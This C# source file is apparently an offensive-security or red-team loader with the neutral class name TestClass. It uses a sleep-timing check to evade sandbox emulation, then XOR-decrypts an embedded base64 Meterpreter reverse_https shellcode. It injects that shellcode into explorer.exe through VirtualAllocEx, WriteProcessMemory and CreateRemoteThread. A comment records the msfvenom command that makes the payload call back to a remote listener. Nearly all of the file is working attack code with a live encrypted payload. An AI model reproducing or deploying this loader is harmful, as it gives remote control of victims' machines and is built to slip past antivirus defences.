using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")]
    static extern void Sleep(uint dwMilliseconds);
    public TestClass()
    {

        /* EVASION 1: Sleep to evade emulation */

        DateTime t1 = DateTime.Now;
        Sleep(2000);
        double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
        string key = "Sup3rS3cr3t!"; // good key
        if (t2 < 2)
        {
            key = "NowayNoway!"; // wrong key
        }

        if (key == "NowayNoway!")
        {
            Sleep(1000);
        }
        else
        {
            /*
            Meter payload en shellcode_encrypter.cs

            cosmic @kali:~$ msfvenom - p windows / x64 / meterpreter / reverse_https LHOST = 192.168.49.158 LPORT = 443 EXITFUNC = thread - f csharp > / tmp / met.cs
            [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
            [-] No arch selected, selecting arch: x64 from the payload
            No encoder specified, outputting raw payload
            Payload size: 666 bytes
            Final size of csharp file: 3406 bytes
            */

            /*
              PS C:\Users\the_d> "X:\ConsoleApp1\Shellcode Encrypter 1\bin\x64\Release\Shellcode Encrypter 1.exe"
            */



            //192.168.1.166
            string base64Encoded = "rz3z14K7/2NyMzVwEiUiYjpi4TUXe/9zMz37YWobuDFSfkXoG3rHeTgbuBEie0Xh/0kRT3B/EyKz+nlgUrSS3iAbuDFSuDYdEiQ4MqI1shtqOHYu1gdwM3LYs+tyM3Rp1rUEVDpS4+g6KyRl2DVQenOD0DU6zL1g2EH4fkOae2Kke0Xh/zSx+n8SMqJK0wHQH3Y8F3oWCrIH6yxl2DVUenODVSL5Pzxl2DVsenODcuh2uzwggzQocioNajkzazV4Ei84sJ5zcjGN0yxgCi84uGC6eJyNzClpYq4jeswkWg0bXRFVUzQme/uyeqSwfwMHVIqlYCEbuoIhaTkQkzhB+iEAetlIZQ2GU3VwM42G221yM3QQakdeAkRrHVJcAkIXUy84urMa9KPJMnQhHkS5YCE5MDA7iSOozLNwM3JTzLaaQnQhU1pBRENjQSgqdh5JPxYoAkM3YzweeSRWOiw3HkVnWhcgRztlIy0GACAEV1IlfjlCKgEhSjwdBSw5XS57PzwAeRsqYg8QSx5COUIFCwM2XTkCUjZzA0RCAR4XazwqXRpIakUqZRkrAgwiAjxnEkdHQEpTe+qzYC5gCzhB+iEbi2NAm/AhU3VwYyEAeqSw2CEPaIqle/uVWWkte/3QOWoqYRrTAGNyev3BOXExajvpRiXstXQhU3WP5j9i8zAoe/3QHkS5fkOaYDA79LYMVW0LzKfW8xZte7Pg22ZwMzvpd5NH03QhU3WP5jqs/Bdw2N7JBnVwMyEKWSMoev3wkpdgerWTM3NyMz2bC9Ej1nJTM2ON5jyyACY4upUbupI6uq5olLVwE3JTeuqLes4zxfySM3JTM5yne/flc/CwR8A1uGQ6MrekkwCia7ELWWMriJQ8eX8xuqis5g==";


            byte[] buf = System.Convert.FromBase64String(base64Encoded);

            /* Meterpreter decryption */
            Console.WriteLine("[+] Decrypting the shellcode");
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] ^ key[i % (key.Length)]) & 0xFF);
            }

            Process p = Process.GetProcessesByName("explorer")[0];
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, p.Id);

            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}

